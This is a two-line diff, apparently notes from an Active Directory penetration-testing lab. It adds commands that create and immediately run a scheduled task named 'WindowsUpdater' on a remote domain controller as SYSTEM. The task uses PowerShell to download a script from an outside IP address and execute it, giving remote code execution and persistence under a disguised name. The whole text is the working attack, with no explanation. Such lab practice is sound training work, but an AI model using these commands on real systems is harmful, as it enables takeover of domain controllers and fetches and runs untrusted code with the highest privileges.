@@ -1,0 +1,2 @@
+schtasks /create /s dcorp-dc.dollarcorp.moneycorp.local /ru "NT AUTHORITY\SYSTEM" /sc weekly /tn "WindowsUpdater" /tr "powershell.exe -c 'iex((new-object net.webclient).downloadstring('''http://172.16.99.32/callme.ps1'''))'"
+schtasks /S dcorp-dc.dollarcorp.moneycorp.local /run /tn windowsupdater
